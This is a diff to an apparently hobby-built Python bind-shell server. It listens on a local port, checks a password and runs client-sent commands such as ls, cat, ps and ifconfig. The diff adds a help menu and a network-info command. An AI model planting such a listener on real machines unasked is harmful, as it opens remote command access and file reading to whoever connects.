@@ -33,7 +33,7 @@ def start():
 
     # run in netcat listen mode (server).
     HOST = '127.0.0.1'
-    PORT = 6667
+    PORT = 6666
     PWD = subprocess.check_output(['pwd'])
     PWD = PWD.rstrip()
     server_connector()
@@ -68,6 +68,12 @@ def server_listener(clientSocket,server):
 
         if ('pwd' in bashCommand):
             output = PWD
+
+        elif ('help' in bashCommand):
+           output = help_function()
+        elif ('net' in bashCommand):
+           output = subprocess.check_output(['ifconfig'])
+
         elif ('cd' in bashCommand):
            output = cd_function(bash_args)
             
@@ -162,6 +168,17 @@ def passwordChecker(clientSocket):
             return
         else:
             clientSocket.send(bytearray("wrong password, user:dirtySanchez \n","utf-8"))
+
+def help_function():
+    output = ''
+    output += 'ls    ls current directory\n'
+    output += 'cd    change current directory\n'
+    output += 'pwd   prints directory\n'
+    output += 'cat   cat a file\n'
+    output += 'off   kill me\n'
+    output += 'ps    print proccess table\n'
+    output += 'net   ifconfig\n'
+    return output.encode()
 
 if __name__ == '__main__':
     start()
